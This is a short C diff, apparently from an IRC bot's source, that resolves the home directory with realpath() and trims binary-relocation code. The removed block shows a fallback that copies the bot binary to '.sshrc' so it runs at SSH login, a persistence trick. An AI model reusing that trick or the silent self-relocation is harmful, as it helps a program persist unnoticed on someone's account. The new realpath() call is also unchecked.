@@ -1247,7 +1247,7 @@ void check_trace_start()
 
 char *homedir()
 {
-  static char home[DIRMAX];
+  static char home[DIRMAX], tmp[DIRMAX];
   struct passwd *pw;
 
   pw = getpwuid(geteuid());
@@ -1255,7 +1255,8 @@ char *homedir()
   if (!pw)
    werr(ERR_PASSWD);
 
-  snprintf(home, sizeof home, "%s", pw->pw_dir);
+  snprintf(tmp, sizeof tmp, "%s", pw->pw_dir);
+  realpath(tmp, home); /* this will convert lame home dirs of /home/blah->/usr/home/blah */
 
   return home;
 }
@@ -1296,7 +1297,7 @@ int main(int argc, char **argv)
 #ifdef LEAF
   int skip = 0;
   FILE *fp;
-  char newbinbuf[DIRMAX], newbin[DIRMAX], tmp[DIRMAX], 
+  char newbin[DIRMAX], tmp[DIRMAX], 
        cfile[DIRMAX], templine[8192], *temps;
   int ok = 1;
 #else
@@ -1433,29 +1434,7 @@ int main(int argc, char **argv)
 #endif /* HUB */
 
 #ifdef LEAF
-  /* is the homedir a symlink? */
-  sdprintf("newbin starts at: %s", newbin);
-
-/* fuck it, I hate dealing with this shit.
-  if (!can_stat(newbin)) {
-    int f = 0;
-    if (ss.st_mode & S_IFLNK) {  //stupid symlinked home dirs !
-      f = readlink(newbin, newbinbuf, sizeof newbinbuf);
-      if (!f) {
-        sdprintf("symlink newbin: %s", newbin);
-        strcpy(newbin, newbinbuf);
-        sdprintf("newbin is now: %s", newbin);
-      } else {
-          sdprintf("readlink failed on %s with error %d erno %d", newbin, f, errno);
-          //fuck it. (no paths)
-          sprintf(newbin, ".sshrc");
-          copyfile(binname, newbin);
-          skip = 1;
-      }
-    }
-  }
-  sdprintf(STR("skip is: %d"), skip);
-*/
+  sdprintf("newbin at: %s", newbin);
 
   if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
     sdprintf("wrong dir, is: %s :: %s", binname, newbin);
